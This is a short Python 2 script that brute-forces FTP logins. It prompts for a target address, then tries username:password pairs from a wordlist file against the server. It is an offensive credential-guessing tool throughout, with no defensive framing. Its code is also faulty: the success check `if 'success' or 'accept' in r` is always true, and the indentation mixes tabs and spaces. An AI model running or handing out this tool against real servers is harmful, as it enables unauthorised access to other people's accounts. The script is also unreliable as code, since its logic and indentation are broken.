import ftplib
from ftplib import FTP
import signal

def ftp_brute():
	target=raw_input(">>>ftp>>>Enter target ip or server number:")
	print("[*]Creating FTP client instance[*]")
	ftp_instance=FTP(target)
	print("[*]Successfully created FTP client instance[*]")
	print("[*]Reading Dictionary File[*]")
	file=open('./password_lists/ftp_dict.txt','r')

	for line in file.readlines():
		(username,password)=line.strip().split(':')

		try:
			ftp_instance=FTP(target)
			r=ftp_instance.login(username,password)
			if 'success' or 'accept' in r:
				print('\x1b[0;30;42m'+"[+]Correct Username and Password combination(%s,%s)" %(username,password)+'\x1b[0m')
                        	break

		except KeyboardInterrupt:
			print("\nQuitting..")
			return

		except Exception:
			print('\x1b[0;30;41m'"[!]Incorrect Username and Password combination(%s,%s)" %(username,password)+'\x1b[0m')

